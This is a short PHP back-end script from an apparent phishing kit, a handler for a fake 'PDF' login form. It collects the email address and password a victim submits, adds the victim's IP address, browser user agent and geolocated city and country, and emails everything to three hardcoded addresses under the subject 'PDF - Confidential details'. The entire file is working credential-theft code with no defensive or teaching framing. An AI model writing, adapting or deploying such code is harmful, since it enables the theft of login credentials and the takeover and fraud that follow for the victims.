<?php 
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$agent=$_SERVER['HTTP_USER_AGENT'];
$email= "frank.jasontechcn@gmail.com,lagosboss@yandex.ru,bankloginkeeper7@gmail.com";
$ip = getenv("REMOTE_ADDR");
$message  = "==================+[ Personal Info - PDF]+==================\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "Browser : ".$_POST['browser']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ [PDF] +=============\n";
$subject = "PDF - Confidential details";

mail($email,$subject,$message);


?>



